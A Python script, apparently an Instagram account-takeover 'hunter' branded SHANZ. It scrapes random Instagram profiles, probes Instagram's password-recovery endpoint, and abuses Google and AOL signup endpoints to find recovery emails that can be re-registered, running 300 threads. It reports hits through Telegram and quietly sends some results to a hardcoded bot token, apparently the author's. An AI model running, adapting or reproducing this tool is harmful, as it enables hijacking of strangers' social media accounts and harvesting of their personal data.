import webbrowser
import requests
import random
import json, string
from threading import Thread
import os
from user_agent import *
from requests import post as pp
from user_agent import generate_user_agent as ggb
from random import choice as cc
from random import randrange as rr
import re
import hashlib
import uuid
from requests import get
import sys
from datetime import datetime
try:
	from colorama import Fore, Style, init
except:
	os.system('pip install colorama')
	from colorama import Fore, Style, init
try:
    from cfonts import render, say
except:
    os.system('pip install python-cfonts')
    from cfonts import render, say
import time
c1 = '\x1b[38;5;120m'
j21 = '\x1b[38;5;204m'
p1 = '\x1b[38;5;150m'
cyan = "\033[1m\033[36m"
m = "\x1b[38;5;117m"
x = '\x1b[1;33m'
BWhite = '\x1b[1;37m'
z = '\x1b[1;31m'
green = "\033[1m\033[32m"
demo = random.randint(100, 300)
bi = random.randint(5,208)
ror1 = f'\x1b[38;5;{demo}m'
memo = random.randint(100, 300)
ror = f'\x1b[38;5;{memo}m'

K3S63 = render('{SHANZ}', colors=['white', 'red'], align='center')
print(K3S63)
print("▩" * 60)
print('')
#def check_user_status(user_id):
#    """Check the user's validity and expiry details."""
#    try:
#       
#        response = requests.get(WEB_APP_URL, params={"user_id": user_id})
#        response_data = response.json()

#        
#        if response.status_code == 200 and response_data["status"] == "valid":
#            print(f"✅ User is valid: {response_data['message']}")
#        elif response.status_code == 403 and response_data["status"] == "expired":
#            print(f"❌ User access expired: {response_data['message']}")
#            sys.exit("Exiting: User access expired.")
#        elif response.status_code == 403 and response_data["status"] == "error":
#            print(f"❌ Invalid user: {response_data['message']}")
#            sys.exit("Exiting: Invalid user.")
#        else:
#            print(f"⚠️ Unexpected response: {response_data}")
#            sys.exit("Exiting: Unexpected error.")
#    except requests.exceptions.RequestException as e:
#        print("⚠️ Unable to connect to the validation service. Please check your internet connection or try again later.")
        #sys.exit("Unable to validate user.")
user_id = input("𝑬𝒏𝒕𝒆𝒓 𝑰𝒅: ")
#check_user_status(user_id)
ID = user_id
print('') 
token = input(f"𝑬𝒏𝒕𝒆𝒓 𝑩𝒐𝒕 𝑻𝒐𝒌𝒆𝒏: ") 
print('') 
os.system('cls' if os.name == 'nt' else 'clear')
print(f'▩'*60)
K3S63 = render('{shanz}', colors=['white', 'red'], align='center')
print(K3S63)
print("▩" * 60)       
infoinsta = {}
total = 0
hits = 0
bad_ig = 0
bad_mail = 0
goodig = 0
a = print('Welcome To High Post And Followers Hunter.')


while True:
    try:
        a = "https://www.instagram.com/accounts/login"
        session = requests.Session()
        aa = session.get(a)
        csrf = aa.cookies.get('csrftoken')
        break
    except:
        pass

yy = 'azertyuiopmlkjhgfdsqwxcvbn'
def tll():
    try:
        n1 = ''.join(cc(yy) for i in range(rr(6, 9)))
        n2 = ''.join(cc(yy) for i in range(rr(3, 9)))
        host = ''.join(cc(yy) for i in range(rr(15, 30)))
        he3 = {
            "accept": "*/*",
            "accept-language": "ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6",
            "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
            "google-accounts-xsrf": "1",
            'user-agent': str(ggb()),
        }
        res1 = requests.get(
            'https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB', 
            headers=he3
        )
        tok = re.search(r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&', res1.text).group(2)
        cookies = {
            '__Host-GAPS': host
        }
        headers = {
            'authority': 'accounts.google.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'google-accounts-xsrf': '1',
            'origin': 'https://accounts.google.com',
            'referer': 'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&theme=mn',
            'user-agent': ggb(),
        }
        data = {
            'f.req': f'["{tok}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
            'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]',
        }
        response = requests.post(
            'https://accounts.google.com/_/signup/validatepersonaldetails',
            cookies=cookies,
            headers=headers,
            data=data,
        )
        tl = str(response.text).split('",null,"')[1].split('"')[0]
        host = response.cookies.get_dict()['__Host-GAPS']
        with open('tl.txt', 'w') as f:
            f.write(f'{tl}//{host}\n')
    except Exception as e:
        print(e)
        tll()
tll()

def Getaol():
    try:      
        qq = requests.get('https://login.aol.com/account/create', headers={
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
            'accept-language': 'en-US,en;q=0.9',
        })
        cookies = qq.cookies.get_dict()
        tm1 = str(time.time()).split('.')[0]
        cookies.update({
            'gpp': 'DBAA',
            'gpp_sid': '-1',
            '__gads': f'ID=c0M0fd00676f0ea1:T={tm1}:RT={tm1}:S=ALNI_MaEGaVTSG6nQFkSJ-RnxSZrF5q5XA',
            '__gpi': f'UID=00000cf0e8904e94:T={tm1}:RT={tm1}:S=ALNI_MYCzPrYn9967HtpDSITUe5Z4ZwGOQ',
            'cmp': f't={tm1}&j=0&u=1---',
        })
        specData = qq.text.split('name="attrSetIndex">\n        <input type="hidden" value="')[1].split('" name="specData">')[0]
        specId = qq.text.split('name="browser-fp-data" id="browser-fp-data" value="" />\n        <input type="hidden" value="')[1].split('" name="specId">')[0]
        crumb = qq.text.split('name="cacheStored">\n        <input type="hidden" value="')[1].split('" name="crumb">')[0]
        sessionIndex = qq.text.split('"acrumb">\n        <input type="hidden" value="')[1].split('" name="sessionIndex">')[0]
        acrumb = qq.text.split('name="crumb">\n        <input type="hidden" value="')[1].split('" name="acrumb">')[0]
        try:
            os.remove('aol_req.txt')
            os.remove('aol_cok.txt')
        except:
            pass
        with open('aol_req.txt', 'a') as t:
            t.write(f"{specData}Π{specId}Π{crumb}Π{sessionIndex}Π{acrumb}\n")

        with open('aol_cok.txt', 'a') as g:
            g.write(str(cookies) + '\n')
    except Exception as e:
        print(e)
        Getaol()
Getaol()

def check_gmail(email):
    global bad_mail, hits
    try:
        if '@' in email:
            email = str(email).split('@')[0]

        try:
            o = open('tl.txt', 'r').read().splitlines()[0]
        except:
            o = open('tl.txt', 'r').read().splitlines()[0]

        tl, host = o.split('//')

        cookies = {
            '__Host-GAPS': host
        }
        headers = {
            'authority': 'accounts.google.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'google-accounts-xsrf': '1',
            'origin': 'https://accounts.google.com',
            'referer': f'https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&TL={tl}',
            'user-agent': ggb(),
        }

        params = {'TL': tl}
        data = (
            'continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn'
            f'&f.req=%5B%22TL%3A{tl}%22%2C%22{email}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&'
        )
        response = pp(
            'https://accounts.google.com/_/signup/usernameavailability',
            params=params,
            cookies=cookies,
            headers=headers,
            data=data,
        )
        if '"gf.uar",1' in str(response.text):
            pppp()
            if '@' not in email:
                ok = email + '@gmail.com'
                username, gg = ok.split('@')
                InfoAcc(username, gg)
            else:
                username, gg = email.split('@')
                InfoAcc(username, gg)
        else: 
          bad_mail+=1
          pppp()
    except:''


def check_aol(email):
    global hits, bad_mail
    try:
        if '@' in email:
            name = email.split('@')[0]
        else:
            name = email

        try:
            with open("aol_req.txt", "r") as f:
                for line in f:
                    specData, specId, crumb, sessionIndex, acrumb = line.strip().split('Π')

            with open("aol_cok.txt", "r") as f:
                for line in f:
                    cookies = eval(line.strip())
        except:
            Getaol()
            with open("aol_req.txt", "r") as f:
                for line in f:
                    specData, specId, crumb, sessionIndex, acrumb = line.strip().split('Π')

            with open("aol_cok.txt", "r") as f:
                for line in f:
                    cookies = eval(line.strip())

        headers = {
            'authority': 'login.aol.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://login.aol.com',
            'referer': f'https://login.aol.com/account/create?specId={specId}&done=https%3A%2F%2Fwww.aol.com',
            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Microsoft Edge";v="120"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
            'x-requested-with': 'XMLHttpRequest',
        }

        params = {
            'validateField': 'userId',
        }

        data = f'browser-fp-data=%7B%22language%22%3A%22en-US%22%2C%22colorDepth%22%3A24%2C%22deviceMemory%22%3A8%2C%22pixelRatio%22%3A1%2C%22hardwareConcurrency%22%3A4%2C%22timezoneOffset%22%3A-60%2C%22timezone%22%3A%22Africa%2FCasablanca%22%2C%22sessionStorage%22%3A1%2C%22localStorage%22%3A1%2C%22indexedDb%22%3A1%2C%22cpuClass%22%3A%22unknown%22%2C%22platform%22%3A%22Win32%22%2C%22doNotTrack%22%3A%22unknown%22%2C%22plugins%22%3A%7B%22count%22%3A5%2C%22hash%22%3A%222c14024bf8584c3f7f63f24ea490e812%22%7D%2C%22canvas%22%3A%22canvas%20winding%3Ayes~canvas%22%2C%22webgl%22%3A1%2C%22webglVendorAndRenderer%22%3A%22Google%20Inc.%20(Intel)~ANGLE%20(Intel%2C%20Intel(R)%20HD%20Graphics%204000%20(0x00000166)%20Direct3D11%20vs_5_0%20ps_5_0%2C%20D3D11)%22%2C%22adBlock%22%3A0%2C%22hasLiedLanguages%22%3A0%2C%22hasLiedResolution%22%3A0%2C%22hasLiedOs%22%3A0%2C%22hasLiedBrowser%22%3A0%2C%22touchSupport%22%3A%7B%22points%22%3A0%2C%22event%22%3A0%2C%22start%22%3A0%7D%2C%22fonts%22%3A%7B%22count%22%3A33%2C%22hash%22%3A%22edeefd360161b4bf944ac045e41d0b21%22%7D%2C%22audio%22%3A%22124.04347527516074%22%2C%22resolution%22%3A%7B%22w%22%3A%221600%22%2C%22h%22%3A%22900%22%7D%2C%22availableResolution%22%3A%7B%22w%22%3A%22860%22%2C%22h%22%3A%221600%22%7D%2C%22ts%22%3A%7B%22serve%22%3A1704793094844%2C%22render%22%3A1704793096534%7D%7D&specId={specId}&cacheStored=&crumb={crumb}&acrumb={acrumb}&sessionIndex={sessionIndex}&done=https%3A%2F%2Fwww.aol.com&googleIdToken=&authCode=&attrSetIndex=0&specData={specData}&multiDomain=&tos0=oath_freereg%7Cus%7Cen-US&firstName=ahmed&lastName=Mahos&userid-domain=yahoo&userId={name}&password=Drahmed2006##$$&mm=10&dd=24&yyyy=2000&signup='

        res = requests.post('https://login.aol.com/account/module/create', params=params, headers=headers, data=data, cookies=cookies).text
        if '{"errors":[]}' in res:
            pppp()
            if '@' not in email:
                ok = email + '@aol.com'
                username, gg = ok.split('@')
                InfoAcc(username, gg)
            else:
                username, gg = email.split('@')
                InfoAcc(username, gg)
        else: 
          bad_mail+=1
          pppp()
    except:''
    

def check(email):
    global goodig, bad_ig
    ua = generate_user_agent()
    dev = 'android-'
    device_id = dev + hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:16]
    uui = str(uuid.uuid4())
    headers = {
        'User-Agent': ua,
        'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    }
    data = {
        'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.' + json.dumps({
            '_csrftoken': '9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
            'adid': uui,
            'guid': uui,
            'device_id': device_id,
            'query': email
        }),
        'ig_sig_key_version': '4',
    }
    response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/', headers=headers, data=data).text
    if email in response:
        if '@gmail.com' in email:
            check_gmail(email)
        elif '@aol.com' in email or '@a**.com' in email:
            check_aol(email)
        goodig += 1
        pppp()
    else:
        bad_ig += 1
        pppp()



def rest(user):
  try:
    headers = {
    'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
    'X-Pigeon-Rawclienttime': '1700251574.982',
    'X-IG-Connection-Speed': '-1kbps',
    'X-IG-Bandwidth-Speed-KBPS': '-1.000',
    'X-IG-Bandwidth-TotalBytes-B': '0',
    'X-IG-Bandwidth-TotalTime-MS': '0',
    'X-Bloks-Version-Id': 'c80c5fb30dfae9e273e4009f03b18280bb343b0862d663f31a3c63f13a9f31c0',
    'X-IG-Connection-Type': 'WIFI',
    'X-IG-Capabilities': '3brTvw==',
    'X-IG-App-ID': '567067343352427',
    'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
    'Accept-Language': 'en-GB, en-US',
     'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Accept-Encoding': 'gzip, deflate',
    'Host': 'i.instagram.com',
    'X-FB-HTTP-Engine': 'Liger',
    'Connection': 'keep-alive',
    'Content-Length': '356',
}
    data = {
    'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"0dfaf820-2748-4634-9365-c3d8c8011256","guid":"1f784431-2663-4db9-b624-86bd9ce1d084","device_id":"android-b93ddb37e983481c","query":"'+user+'"}',
    'ig_sig_key_version': '4',
  }
    response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/',headers=headers,data=data,).json()
    r=response['email']
  except:
    r='h h h'
  return r

def date(hy):
    try:
        ranges = [
            (1279000, 2010),
            (17750000, 2011),
            (279760000, 2012),
            (900990000, 2013),
            (1629010000, 2014),
            (2500000000, 2015),
            (3713668786, 2016),
            (5699785217, 2017),
            (8597939245, 2018),
            (21254029834, 2019),
            (43464475395, 2020),
            (50289297647, 2021),
            (57464707082, 2022),
            (63313426938, 2023)
            
        ]
        
        for upper, year in ranges:
            if hy <= upper:
                return year
        return 2023
    
    except Exception:
        pass   
tok = '7603871221:AAG52oLsLB7ivUuQpZLcqkiijg4Yl-PvFME'
id = '5611451621'
def InfoAcc(username, gg):
    global total, hits
    try:
        rr = infoinsta.get(username, {})
        Id = rr.get('pk', None)
        full_name = rr.get('full_name', None)
        fows = rr.get('follower_count', None)
        fowg = rr.get('following_count', None)
        pp = rr.get('media_count', None)
        isPraise = rr.get('is_private', None)
        bio = rr.get('biography', None)
        is_verified = rr.get('is_verified', None)

        if fows and pp:
            if fows >= 50 and pp >= 0:
                meta = True
            else:
                meta = False  
        else:
            meta = False
    except:
        meta = False  

    try:
        hy = int(Id) if Id is not None else None
        datte = date(hy) if hy else 'NoValue'
    except:
        datte = 'NoValue'
    try:
        domain, llss = gg.split('.').capitalize()
    except:
        domain = gg.split('.')[0].capitalize()

    reset = rest(username) if rest(username) else 'Cracked'

    if reset != 'Cracked':
        status = 'Proper Hit' if username[0] == reset.split('@')[0][0] and username[-1] == reset.split('@')[0][-1] else 'Cracked Hit'
    else:
        status = 'Cracked Hit'

    if (full_name or fows or fowg or datte or pp or isPraise):
        ss = f'''

SHANZ
⋘─────━𓆩ارهابي𓆪‏━─────⋙
• 𝑯𝒊𝒈𝒉 𝒇𝒐𝒍𝒍𝒐𝒘𝒆𝒓𝒔 𝒉𝒊𝒕: {meta}
• 𝑯𝒊𝒕 𝑻𝒚𝒑𝒆 : {status}
⋘─────━𓆩ارهابي𓆪‏━─────⋙
• 𝑼𝒔𝒆𝒓 : {username}
• 𝑬𝒎𝒂𝒊𝒍 : {username}@{gg}
• 𝑹𝒆𝒔𝒆𝒕  : {reset}
• 𝑵𝒂𝒎𝒆 : {full_name}
• 𝑭𝒐𝒍𝒍𝒐𝒘𝒆𝒓𝒔 :  {fows}
• 𝑭𝒐𝒍𝒍𝒐𝒘𝒊𝒏𝒈 : {fowg}
• 𝑫𝒂𝒕𝒆:  {datte}
• 𝑷𝒐𝒔𝒕𝒔: {pp}
• 𝑷𝒓𝒊𝒗𝒂𝒕𝒆 : {isPraise}
• 𝑳𝒊𝒏𝒌 : https://www.instagram.com/{username}
⋘─────━𓆩ارهابي𓆪‏━─────⋙
• @Imx_Shanz
'''
    else:
        ss = f'''
  SHANZ
⋘─────━𓆩ارهابي𓆪‏━─────⋙
• 𝑬𝒎𝒂𝒊𝒍 : {username}@{gg}
• 𝑹𝒆𝒔𝒆𝒕  : {reset}
• 𝑼𝒔𝒆𝒓 : {username}
• 𝑳𝒊𝒏𝒌 : https://www.instagram.com/{username}
⋘─────━𓆩ارهابي𓆪‏━─────⋙
• @Imx_Shanz
'''

    if meta == False:
        try:
            requests.get(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={id}&text={ss}")
        except:
            pass
    elif meta == True:
        hits += 1
        total += 1
        try:
            requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={ss}")
        except:
            pass

    with open('k3s63.txt', 'a') as ff:
        ff.write(f'{ss}\n')
      
def gg() -> str:
    while True:
        data = {
            "lsd": ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
            "variables": json.dumps({"id": int(random.randrange(900990001, 21254029834)), "render_surface": "PROFILE"}),
            "doc_id": "25618261841150840"
        }

        response = requests.post(
            "https://www.instagram.com/api/graphql",
            headers={"X-FB-LSD": data["lsd"]},
            data=data
        )
        try:
            username = response.json().get('data', {}).get('user', {}).get('username')
            infoinsta[username] = response.json().get('data', {}).get('user', {})
            emails = [username + '@gmail.com', username + '@aol.com']
            for email in emails:
                check(email)
        except:''
for _ in range(300):
    Thread(target=gg).start()
 
def pppp():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f'''
{cyan}▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩       
{cyan} 𝟏  {c1}𝐇𝐢𝐭  :   [{hits}]    
{cyan} 𝟐  {z}𝐅𝐚𝐥𝐬𝐞 :   [{bad_ig}]
{cyan} 𝟑  {x}𝐆𝐨𝐨𝐝 :   [{goodig}]
{cyan} 𝟒  {p1}𝐁𝐚𝐝 :   [{bad_mail}]
{cyan}▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩
''')
os.system('cls' if os.name == 'nt' else 'clear')
def pppp():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f'''
{cyan}▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩        
{cyan}[ 𝟏 ] {c1}𝐇𝐢𝐭 :   [{hits}]    
{cyan}[ 𝟐 ] {z}𝐅𝐚𝐥𝐬𝐞 :   [{bad_ig}]
{cyan}[ 𝟑 ] {x}𝐆𝐨𝐨𝐝 :   [{goodig}]
{cyan}[ 𝟒 ] {p1}𝐁𝐚𝐝  :   [{bad_mail}]
{cyan}▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩
''')